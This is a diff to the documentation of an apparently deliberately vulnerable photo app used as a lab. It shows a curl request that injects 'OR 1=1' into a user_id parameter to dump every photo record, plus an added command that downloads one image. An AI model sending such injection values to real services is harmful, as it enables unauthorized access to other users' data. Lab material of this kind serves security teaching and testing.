@@ -130,7 +130,7 @@ mysql> select * from photos;
 }
 
 
-utkalika@utkalika:~/Work/vulnerable-photo-app$ curl -X GET "http://10.5.20.45:8000/api/photos?user_id=1%20OR%201%3D1"
+curl -X GET "http://10.5.20.45:8000/api/photos?user_id=1%20OR%201%3D1"
 {
   "photos": [
     [
@@ -154,6 +154,9 @@ utkalika@utkalika:~/Work/vulnerable-photo-app$ curl -X GET "http://10.5.20.45:80
   ], 
   "status": "success"
 }
+
+curl -X GET "http://10.5.20.45:8000/api/photos/b40051e6-de40-42fb-aee5-82646e39f2a8.png" --output downloaded_image.png
+
 
 ```
 docker tag usatpath01/vulnerable-photo-app-analytics-service:v1 usatpath01/vulnerable-photo-app-analytics-service:v1
